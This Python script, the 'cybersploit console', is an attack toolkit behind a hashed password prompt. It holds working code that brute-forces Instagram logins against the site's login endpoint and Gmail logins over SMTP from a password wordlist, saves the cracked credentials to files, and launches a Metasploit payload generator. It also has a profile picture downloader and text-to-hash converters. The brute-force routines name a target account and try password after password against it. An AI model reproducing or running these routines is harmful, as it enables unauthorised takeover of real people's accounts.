#!/bin/python

#<<<---------------IMPORT SECTION--------------->>>

from __future__ import absolute_import
from __future__ import print_function
import requests, sys, threading, time, os, random
from random import randint
from six.moves import input
import re
from datetime import datetime
import smtplib
import sys
import hashlib
import instaloader
import subprocess
from os import system

#<<<---------------INTRO SECTION--------------->>>

print ("\033[1;33m		    _                         _       _ _")
print ("\033[1;33m	  ___ _   _| |__   ___ _ __ ___ _ __ | | ___ (_) |_")
print ("\033[1;33m	 / __| | | | '_ \ / _ \ '__/ __| '_ \| |/ _ \| | __|")
print ("\033[1;33m	| (__| |_| | |_) |  __/ |  \__ \ |_) | | (_) | | |_")
print ("\033[1;33m	 \___|\__, |_.__/ \___|_|  |___/ .__/|_|\___/|_|\__|")
print ("\033[1;33m	      |___/                    |_|")
print ("\033[1;33m	        ___ ___  _ __  ___  ___ | | ___")
print ("\033[1;33m	       / __/ _ \| '_ \/ __|/ _ \| |/ _ \\")
print ("\033[1;33m	      | (_| (_) | | | \__ \ (_) | |  __/")
print ("\033[1;33m	       \___\___/|_| |_|___/\___/|_|\___|")

print ("\n")
print ("\033[1;31m<<<------------welcome to cybersploit_,frame_work------------>>>")
print ("\033[1;37m>>>coded in python && Authoured by jk   !")
print ("\n")

#<<<---------------TOOL SECTION--------------->>>

while True:
	name = input("\033[1;36mEnter ur username ->> ")
	mystring = input("\033[1;36mEnter your password --> ")
	hash_object = hashlib.md5(mystring.encode())
	code = (hash_object.hexdigest())
	if (code == 'd7b3751da886d06345edb877026cb026'):
		print ("\n")
		print ("\033[1;33maccess granted :)")
		print ("\n")
		print ("\033[1;33mwelcome to tools section >>>",(name))
		print ("\n")
		while True:
			print ("\033[1;37m>>>select any of the following options")
			print ("\n")
			print ("\033[1;37m1:for metasploit payload generator")
			print ("\033[1;37m2:for insta brute force :")
			print ("\033[1;37m3:for insta profile pic downloader :")
			print ("\033[1;37m4:for gmail brute force :")
			print ("\033[1;37m5:for text to hash converter")
			print ("\033[1;37mRun 'quit' to exit the program")
			print ("\n")
			option = input("\033[1;32mEnter any from options-->")
#code for payload generator and exploiter :)

			if (option == '1'):
				print ("\033[1;36m<<<--------welcome to metasploit payload generator-------->>>")
				print ("\n")
				print ("\033[1;33m ____     __   ___  ___        ____")
				print ("\033[1;33m|  _ \ __ \ \ / / |/ _ \  __ _|  _ \\")
				print ("\033[1;33m| |_) / _` \ V /| | | | |/ _` | | | |")
				print ("\033[1;33m|  __/ (_| || | | | |_| | (_| | |_| |")
				print ("\033[1;33m|_|   \__,_||_| |_|\___/ \__,_|____/  \033[1;31mGENERATOR!!\n")
				print ("\n")
				print ("\033[1;31mNOTE:- you must have installed metasploit otherwise it will show error!!")
				time.sleep (2)
				print ("\n")
				chek = input("\033[1;37m>>Run 'y' if you have metasploit installed,  '1' to go back and anything to exit else >>> ")

				if (chek == 'y'):
					os.system('.paygen')
				elif (chek == '1'):
					print ("\033[1;36mrestarting the program")
					print ("\n")
					time.sleep (1)
				else:
					print ("\n")
					print ("\033[1;37msince you don't have installed metasploit it can\' run")
					print ("033[1;32mEXITING......!")
					time.sleep (0.4)
					print ("\n")
					exit()


			elif (option == '2'):
				time.sleep (0.4)
				print ("<<<------❣️❣️❣️❣️❣️❣️❣️❣️❣️❣️❣️❣️❣️❣️❣️❣️❣️❣️❣️❣️❣️❣️❣️❣️❣️❣️------>>>")
#code of instagram brute :)
				print ("\033[5;33m	 ___       ____  _      _         ____       __  __")
				print ("\033[5;33m	|_ _|_ __ / ___|| |_   / \   __ _|  _ \ __ _|  \/  |")
				print ("\033[5;33m	 | || '_ \\\___ \| __| / _ \ / _` | |_) / _` | |\/| |")
				print ("\033[5;33m	 | || | | |___) | |_ / ___ \ (_| |  _ < (_| | |  | |")
				print ("\033[5;33m	|___|_| |_|____/ \__/_/   \_\__, |_| \_\__,_|_|  |_|")
				print ("\033[5;33m				    |___/")
				print ("\033[1;35m<<<-----------------welcome to insta-brute force----------------->>>")
				print ("\n")
				CheckVersion = str (sys.version)

				class brute (object):
					def __init__(self):

						try:
							user = input("\033[0m Enter target username---->>> ")
							passlist = input ("\033[0m Enter password <path/wordlist>---->>> ")
							print("\nTarget Username/Email Id: ",user)
							print("\nTrying Password list from:", passlist)

						except:
							print ('')
							sys.exit ()

						with open (passlist, 'r') as x:
							passlistlist = x.read ().splitlines ()
						thread = []
						self.Coutprox = 0
						for passlist in passlistlist:
							password = passlist.split (':')[0]
							t = threading.Thread (target=self.New_Br, args=(user, password))
							t.start ()
							thread.append (t)
							time.sleep (0.9)
							for j in thread:
								j.join ()

					def cls(self):
						linux = 'clear'
						windows = 'cls'
						os.system ([linux, windows][os.name == 'nt'])

					def New_Br(self, user, pwd):
						link = 'https://www.instagram.com/accounts/login/'
						login_url = 'https://www.instagram.com/accounts/login/ajax/'

						time = int (datetime.now ().timestamp ())

						payload = {
							'username': user,
							'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pwd}',
							'queryParams': {},
							'optIntoOneTap': 'false'
						}

						with requests.Session () as s:
							r = s.get (link)
							r = s.post (login_url, data=payload, headers={
								"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
								"X-Requested-With": "XMLHttpRequest",
								"Referer": "https://www.instagram.com/accounts/login/",
								"x-csrftoken": 'ZxKmz4hXp6XKmTPg9lzgYxXN4sFr2pzo'
							})
							print (f'Username: {user}  Trying Password: {pwd}')

							if 'checkpoint_url' in r.text:
								print (('' + user + ':' + pwd + ' : yup! you got the password'))
								with open ('good.txt', 'a') as x:
									x.write (user + ':' + pwd + '\n')
							elif 'two_factor_required' in r.text:
								print (('' + user + ':' + pwd + ' : Two-factor authentication is required here!! '))
								with open ('target_report.txt', 'a') as x:
									x.write (user + ':' + pwd + '\n')


				brute()
				print ("\n")
				print ("If its successfull, check the password in 'target_report.txt' file")
				print ("\n")
				print ("\033[1;34m:)Thankyou for using insta-brute force")
				read = input("\033[1;36m>>choose '1' To open the program again and any other button to exit -->>")
				if (read == '1'):
					print ("restarting the program")
					print ("\n")
					print ("\n")
					print ("\n")
				else:
					exit()
#CODE FOR INSTA PIC DOWNLOADER:)

			elif (option == '3'):
				print ("\033[1;35m<<<---welcome to insta profile pic downloader--->>>")
				print ("\n")
				time.sleep (2)

				ig = instaloader.Instaloader()

				dp = input("\033[1;33mEnter Insta username --->>")
				print ("\033[1;32mplease wait .....!")
				print ("\n")
				time.sleep(0.3)
				ig.download_profile(dp ,profile_pic_only=True)
				print ("\033[1;36mDowmloading finished")
				print ("\n")
				print ("\033[1;34mprofile pic is saved in your current directory with the user's name")
				print ("\n")
				print ("\033[1;31mAfter exiting the program run 'mv -v",(dp),"/sdcard' to move it in your visible device memory")
				print ("\n")
			elif (option == '4'):
# code of Gmail brute :)
				time.sleep (0.4)
				print ("\033[1;32m<<<---------------welcome to gmail brute force--------------->>>")
				print ("\033[1;36m   ##########################################################")
				print ("\033[1;36m   #\033[1;33m                                  \033[1;36m                      #")
				print ("\033[1;36m   #\033[1;33m                     \||/         \033[1;36m                      #")
				print ("\033[1;36m   #\033[1;33m                     |  \033[1;31m@\033[1;33m___oo    \033[1;36m                      #")
				print ("\033[1;36m   #\033[1;33m           /\  /\   / (__\033[1;37m,,,,\033[1;33m|    \033[1;36m                      #")
				print ("\033[1;36m   #\033[1;33m          ) /^\) ^\/ _)           \033[1;35m Gmail-hack!\033[1;36m          #")
				print ("\033[1;36m   #\033[1;33m          )   /^\/   _)           \033[1;31m   CoDeD By:\033[1;36m          #")
				print ("\033[1;36m   #\033[1;33m          )   _ /  / _)           \033[1;31m      jk    \033[1;36m          #")
				print ("\033[1;36m   #\033[1;33m      /\  )/\/ ||  | )_)          \033[1;36m                      #")
				print ("\033[1;36m   #\033[1;33m     <  >      |(,,) )__)         \033[1;36m                      #")
				print ("\033[1;36m   #\033[1;33m      ||      /    \)___)\        \033[1;36m                      #")
				print ("\033[1;36m   #\033[1;33m      | \____(      )___) )___    \033[1;36m                      #")
				print ("\033[1;36m   #\033[1;33m      \______(_______;;; __;;;    \033[1;36m                      #")
				print ("\033[1;36m   #\033[1;33m                                   \033[1;36m                     #")
				print ("\033[1;36m   ##########################################################")
				print ("\n")

				smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
				smtpserver.ehlo()
				smtpserver.starttls()

				user = input("\033[1;37mEnter The Target Gmail Address --> ")
				print("\n")

				passswfile = input('\033[1;37mEnter password <path/wordlist> -->')

				passswfile = open(passswfile, "r")

				for password in passswfile:
					try:
						smtpserver.login(user, password)
						print("[!] Password Found = %s" % password)
						break

					except smtplib.SMTPAuthenticationError:
						print(":-( Password Is Wrong = %s " % password)
				print ("\033[1;34m:)Thankyou for using gmal-brute force")
				read = input("\033[1;36m>>choose '1' To open the program again and any other button to exit-->")
				if (read == '1'):
					print ("\033[1;32mrestarting the program")
					print ("\n")
					print ("\n")
					print ("\n")
				else:
					exit()
#CODE FOR TEXT TO HASH CONVERTER

			elif (option == '5'):
				while True:
					print ("\033[1;35m<<<----Text to Hash converter---->>>\n")
					print ("\n")
					print ("\033[1;37mChoose from following options:-\n")
					print ("\n")
					print ("\033[1;37m1:Text to MD5 converter.")
					print ("\033[1;37m2:Text to SHA1.")
					print ("\033[1;37m3:TEXT to SHA224.")
					print ("\033[1;37m4:Text to SHA256.")
					print ("\033[1;37m5:Text to SHA384.")
					print ("\033[1;37m6:Text to SHA512.")
					print ("\033[1;37mRun 'quit' to exit the program")
					print ("\033[1;37mRun 'back' to relogin and show program list")
					print ("\n")
					optn = input("\033[1;32mEnter ur option-->")
					print ("\n")
					if (optn == '1'):
						time.sleep (0.4)
						print ("\033[1;35m<<<---welcome to Text to MD5 converter--->>>")
						print ("\n")
						mystring = input('\033[1;31mEnter your text--> : ')
						hash_object = hashlib.md5(mystring.encode())
						print ("\033[1;34mResult->",(hash_object.hexdigest()))
						print ("\n")
						time.sleep (0.4)
						read = input("\033[1;36m>>choose '1' To open the program again and any other button to exit-->")
						if (read == '1'):
							print ("\033[1;32mrestarting the program")
							print ("\n")
							print ("\n")
							time.sleep (1)
						else:
							exit()
					elif (optn == '2'):
						time.sleep (0.4)
						print ("\033[1;35m<<<---welcome to Text to SHA1 converter--->>>")
						print ("\n")
						mystring = input('\033[1;31mEnter your text--> ')
						hash_obj = hashlib.sha1(mystring.encode())
						print ("\033[1;34mResult->",(hash_obj.hexdigest()))
						print ("\n")
						time.sleep (0.4)
						read = input("\033[1;36m>>choose '1' To open the program again and any other button to exit-->")
						if (read == '1'):
							print ("\033[1;32mrestarting the program")
							print ("\n")
							print ("\n")
							time.sleep (1)
						else:
							exit()
					elif (optn == '3'):
						time.sleep (0.4)
						print ("\033[1;35m<<<---welcome to Text to SHA224 converter--->>>")
						print ("\n")
						mystring = input('\033[1;31mEnter your text--> ')
						hash_obj = hashlib.sha224(mystring.encode())
						print ("\033[1;34mResult->",(hash_obj.hexdigest()))
						print ("\n")
						time.sleep (0.4)
						read = input("\033[1;36m>>choose '1' To open the program again and any other button to exit-->")
						if (read == '1'):
							print ("\033[1;32mrestarting the program")
							print ("\n")
							print ("\n")
							time.sleep (1)
						else:
							exit()
					elif (optn == '4'):
						time.sleep (0.4)
						print ("\033[1;35m<<<---welcome to Text to SHA256 converter--->>>")
						print ("\n")
						mystring = input('\033[1;31mEnter your text--> ')
						hash_obj = hashlib.sha256(mystring.encode())
						print ("\033[1;34mResult->",(hash_obj.hexdigest()))
						print ("\n")
						time.sleep (0.4)
						read = input("\033[1;36m>>choose '1' To open the program again and any other button to exit-->")
						if (read == '1'):
							print ("\033[1;32mrestarting the program")
							print ("\n")
							print ("\n")
							time.sleep (1)
						else:
							exit()
					elif (optn == '5'):
						time.sleep (0.4)
						print ("\033[1;35m<<<---welcome to Text to SHA384 converter--->>>")
						print ("\n")
						mystring = input('\033[1;31mEnter your text--> ')
						hash_obj = hashlib.sha384(mystring.encode())
						print ("\033[1;34mResult->",(hash_obj.hexdigest()))
						print ("\n")
						time.sleep (0.4)
						read = input("\033[1;36m>>choose '1' To open the program again and any other button to exit-->")
						if (read == '1'):
							print ("\033[1;32mrestarting the program")
							print ("\n")
							print ("\n")
							time.sleep (1)
						else:
							exit()
					elif (optn == '6'):
						time.sleep (0.4)
						print ("\033[1;35m<<<---welcome to Text to SHA512 converter--->>>")
						print ("\n")
						mystring = input('\033[1;31mEnter your text--> ')
						hash_obj = hashlib.sha512(mystring.encode())
						print ("\033[1;34mResult->",(hash_obj.hexdigest()))
						print ("\n")
						time.sleep (0.4)
						read = input("\033[1;36m>>choose '1' To open the program again and any other button to exit-->")
						if (read == '1'):
							print ("\033[1;32mrestarting the program")
							print ("\n")
							print ("\n")
							time.sleep (1)
						else:
							exit()


					elif (optn == 'quit'):
						print ("EXITING.......!")
						exit()

					elif (optn == 'back'):
						break


					else:
						print ("\n")
						print ("Try again with valid option")


			elif (option == 'quit'):
				print ("EXITING........!")
				exit()
			else:
				print ("\033[1;35mplease try again with a valid option")
				time.sleep(0.3)
	else:
		print ("\033[1;34mAccess denied")
		print ("\n")
		time.sleep (0.2)
		print ("\033[1;33mbye bye",(name))
		print ("\n")
		exit()


